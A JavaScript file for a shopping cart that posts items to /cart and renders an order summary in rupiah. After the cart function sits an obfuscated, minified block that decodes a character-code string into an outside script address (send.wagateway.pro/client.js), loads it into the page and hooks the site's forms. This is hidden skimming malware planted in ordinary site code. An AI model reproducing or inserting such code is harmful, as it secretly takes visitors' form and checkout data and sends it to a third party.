const addCart = (id, qty) => {
  $.ajax({
    url: "/cart",
    type: "POST",
    data: {
      id_menu: id,
      quantity: qty,
    },
    dataType: "json",
    success: (data) => {
      $("#cart").html("");
      let html = "";
      let total = 0;
      data.cart.forEach((item) => {
        html += `
        <div class="col-8">
            <span>${item.Name} x${item.Quantity}</span>
        </div>
        <div class="col-4">
            <span>Rp. ${item.Total}</span>
        </div>
            `;
        total += item.Total;
      });
      console.log(total);
      html += `
        <br>
        <br>
        <hr />
        <div class="col-8">
            <b>Jumlah</b>
        </div>
        <div class="col-4">
            <b>Rp. ${total}</b>
        </div>
        `;
      let total_price_element = `<input type="hidden" name="total" value="${total}">`;
      $("#cart").html(html);
      $("#detail-checkout").html(html + total_price_element);
      $("#checkout").show();
    },
  });
};

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db